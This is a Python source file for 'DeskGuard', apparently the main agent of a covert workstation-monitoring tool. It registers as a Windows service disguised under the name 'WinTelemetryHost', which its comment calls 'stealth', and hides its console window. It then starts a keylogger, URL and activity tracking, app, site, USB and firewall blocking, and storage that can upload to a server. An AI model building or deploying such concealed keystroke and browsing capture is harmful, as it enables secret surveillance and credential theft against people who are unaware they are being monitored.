# agent/agent.py — DeskGuard Main Agent
# Runs as a Windows Service named "WinTelemetryHost" (stealth).
#
# Install:  python installer.py install
# Remove:   python installer.py remove
# Debug:    python agent.py debug     (foreground, Ctrl+C to stop)

import os, sys, time, logging, ctypes


def _hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


import config
os.makedirs(config.DATA_DIR, exist_ok=True)

logging.basicConfig(
    filename=config.LOG_FILE, level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("PIL").setLevel(logging.WARNING)
logger = logging.getLogger("agent")

# Import all monitoring modules
from modules import (activity, url_tracker, app_blocker,
                     website_blocker, usb_guard, keylogger, firewall_block)

# Select storage module based on MODE
if config.MODE == "local":
    from modules import local_flush as storage_module
elif config.MODE == "hybrid":
    from modules import hybrid_flush as storage_module
else:
    from modules import uploader as storage_module

import win32serviceutil, win32service, win32event, servicemanager


class DeskGuardService(win32serviceutil.ServiceFramework):
    _svc_name_         = config.SERVICE_NAME
    _svc_display_name_ = config.SERVICE_DISPLAY_NAME
    _svc_description_  = config.SERVICE_DESCRIPTION

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self._stop_event = win32event.CreateEvent(None, 0, 0, None)
        self._running    = True

    def SvcStop(self):
        logger.info("Service stop requested.")
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self._running = False
        win32event.SetEvent(self._stop_event)

    def SvcDoRun(self):
        _hide_console()
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED, (self._svc_name_, ""))
        logger.info(f"Service starting — machine:{config.MACHINE_NAME} mode:{config.MODE}")
        self._run()

    def _run(self):
        try:
            _start_all_modules()
        except Exception as e:
            logger.critical(f"Startup failed: {e}", exc_info=True)
            return
        while self._running:
            rc = win32event.WaitForSingleObject(self._stop_event, 5000)
            if rc == win32event.WAIT_OBJECT_0:
                break
        logger.info("Service stopped.")
        # Cleanup on stop
        website_blocker.remove_blocklist()
        firewall_block.remove_all_firewall_blocks()


def _start_all_modules():
    logger.info("Starting website blocker...")
    website_blocker.start()

    logger.info("Starting firewall block...")
    firewall_block.start()

    logger.info("Starting app blocker...")
    app_blocker.start()

    logger.info("Starting USB guard...")
    usb_guard.start()

    logger.info("Starting activity tracker...")
    activity.start()

    logger.info("Starting URL tracker...")
    url_tracker.start()

    logger.info("Starting keylogger...")
    keylogger.start()

    logger.info(f"Starting storage ({config.MODE} mode)...")
    storage_module.start()

    if config.MODE in ("server", "hybrid"):
        logger.info("Starting config sync...")
        from modules import config_sync
        config_sync.start()

    logger.info("All modules started successfully.")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1].lower() == "debug":
        print("=" * 55)
        print(f" DeskGuard — DEBUG MODE ({config.MODE})")
        print(" Ctrl+C to stop.")
        print("=" * 55)
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(logging.DEBUG)
        ch.setFormatter(logging.Formatter(
            "%(asctime)s [%(levelname)s] %(name)s: %(message)s", "%H:%M:%S"))
        logging.getLogger().addHandler(ch)
        logging.getLogger().setLevel(logging.DEBUG)
        try:
            _start_all_modules()
            print("\n[All modules running. Ctrl+C to stop.]\n")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping...")
            website_blocker.remove_blocklist()
            firewall_block.remove_all_firewall_blocks()
        except Exception as e:
            print(f"\nFATAL ERROR: {e}")
            import traceback; traceback.print_exc()
            input("Press Enter to exit...")
    else:
        win32serviceutil.HandleCommandLine(DeskGuardService)
